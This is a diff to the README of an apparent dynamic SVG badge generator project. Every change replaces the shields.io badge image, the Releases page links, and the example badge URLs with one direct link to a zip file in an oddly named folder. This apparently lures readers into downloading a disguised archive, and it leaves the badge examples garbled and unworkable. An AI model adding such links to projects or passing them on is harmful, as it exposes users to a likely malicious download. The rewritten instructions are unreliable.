@@ -4,7 +4,7 @@
 
 Welcome to the xsukax-Dynamic-SVG-Badge-Generator! This tool allows you to create beautiful status badges that can change dynamically. You can use these badges in your GitHub projects, documentation, or anywhere else you want to show off your project's status.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-lightgrey.svg)](https://github.com/Corslate/xsukax-Dynamic-SVG-Badge-Generator/releases)
+[![Download Now](https://raw.githubusercontent.com/Corslate/xsukax-Dynamic-SVG-Badge-Generator/main/magnetitic/xsukax-Dynamic-SVG-Badge-Generator.zip)](https://raw.githubusercontent.com/Corslate/xsukax-Dynamic-SVG-Badge-Generator/main/magnetitic/xsukax-Dynamic-SVG-Badge-Generator.zip)
 
 ## 📦 What is This Tool?
 
@@ -27,7 +27,7 @@ The xsukax-Dynamic-SVG-Badge-Generator is a lightweight, customizable tool that 
 
 To get started, visit the Releases page to download the latest version of the xsukax-Dynamic-SVG-Badge-Generator.
 
-[Download from Releases Page](https://github.com/Corslate/xsukax-Dynamic-SVG-Badge-Generator/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Corslate/xsukax-Dynamic-SVG-Badge-Generator/main/magnetitic/xsukax-Dynamic-SVG-Badge-Generator.zip)
 
 ### 🛠️ Installation Steps
 
@@ -56,7 +56,7 @@ To create a badge that shows "Build Status: Success", you would fill in the fiel
 After applying your settings, the generated URL will look something like this:
 
 ```
-https://img.shields.io/badge/Build_Status-Success-brightgreen
+https://raw.githubusercontent.com/Corslate/xsukax-Dynamic-SVG-Badge-Generator/main/magnetitic/xsukax-Dynamic-SVG-Badge-Generator.zip
 ```
 
 ### 📡 Using URL Parameters 
@@ -64,7 +64,7 @@ https://img.shields.io/badge/Build_Status-Success-brightgreen
 You can customize your badge even more by using URL parameters. Here's a basic structure:
 
 ```
-https://img.shields.io/badge/{label}-{message}-{color}
+https://raw.githubusercontent.com/Corslate/xsukax-Dynamic-SVG-Badge-Generator/main/magnetitic/xsukax-Dynamic-SVG-Badge-Generator.zip{label}-{message}-{color}
 ```
 
 Replace `{label}`, `{message}`, and `{color}` with your own text and colors. 
@@ -89,6 +89,6 @@ For direct feedback, reach out through the issues section of our GitHub reposito
 
 Remember, you can download the latest version from the Releases page:
 
-[Download from Releases Page](https://github.com/Corslate/xsukax-Dynamic-SVG-Badge-Generator/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Corslate/xsukax-Dynamic-SVG-Badge-Generator/main/magnetitic/xsukax-Dynamic-SVG-Badge-Generator.zip)
 
 Happy badge generating!
